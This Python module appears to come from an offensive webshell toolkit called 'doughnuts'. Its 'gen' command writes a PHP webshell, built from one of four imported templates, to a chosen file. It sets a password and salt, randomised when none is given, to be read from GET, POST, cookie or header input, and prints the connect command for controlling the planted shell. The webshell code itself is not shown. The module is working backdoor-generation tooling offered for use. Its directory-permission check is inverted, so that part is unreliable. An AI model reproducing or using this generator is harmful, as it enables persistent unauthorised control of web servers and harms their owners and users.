from libs.config import alias, color
from os import W_OK, access, path
from string import ascii_letters, digits
from random import sample, randint
from webshell_template import pudding, icecream, popsicle, gululingbo


type_dict = {1: "Pudding", 2: "Icecream", 3: "Popsicle", 4: "Gululingbo"}
func_dict = {1: pudding.get_php, 2: icecream.get_php, 3: popsicle.get_php, 4: gululingbo.get_php}
keyword_dict = {"GET": 3, "POST": 4, "COOKIE": 5, "HEADER": 6}


def ranstr(num):
    return ''.join(sample(ascii_letters + digits, num))


def get_php(keyword: int = 4, passwd: str = "", salt: str = "", _type: int = 1):
    return func_dict[_type](keyword, passwd, salt)


def outside_generate(file_path: str, keyword: str = "POST", passwd: str = "", salt: str = "", _type: int = 1):
    run(file_path, keyword, passwd, salt, _type)


@alias(True, "gen", f="file_path", k="keyword", p="passwd", s="salt")
def run(file_path: str, keyword: str = "POST", passwd: str = "", salt: str = "", _type: int = 1):
    """
    generate

    Generate a webshell using doughnuts encoding (password and salt none is random).

    keyword:
      - GET
      - POST
      - COOKIE
      - HEADER

    _type:
      - 1 : Pudding
      - 2 : Icecream
      - 3 : Popsicle
      - 4 : Gululingbo
    """
    raw_keyword = keyword.upper()
    if (raw_keyword not in keyword_dict):
        print(color.red("\nKeyword error\n"))
        return
    keyword = keyword_dict[raw_keyword]
    if (_type not in type_dict):
        print(color.red("\nType error\n"))
        return
    passwd = passwd if passwd else ranstr(randint(5, 8))
    salt = salt if salt else ranstr(randint(5, 8))
    php = get_php(keyword, passwd, salt, _type)
    if (access(path.dirname(file_path), W_OK)):
        print(color.red("\nFile path is invalid\n"))
        return
    with open(file_path, "w+") as f:
        f.write(php)
    print(color.green(
        f"\ngenerate {type_dict[_type]}'s php in {path.realpath(file_path)}! enjoy it!"))
    print(color.yellow("\nUsage:"))
    print(color.yellow(
        f"    Interactive interface    : connect url {raw_keyword} {passwd} doughnuts-{salt}"))
    print(color.yellow(
        f"    Non-Interactive interface: doughnuts connect url {raw_keyword} {passwd} doughnuts-{salt}\n"))
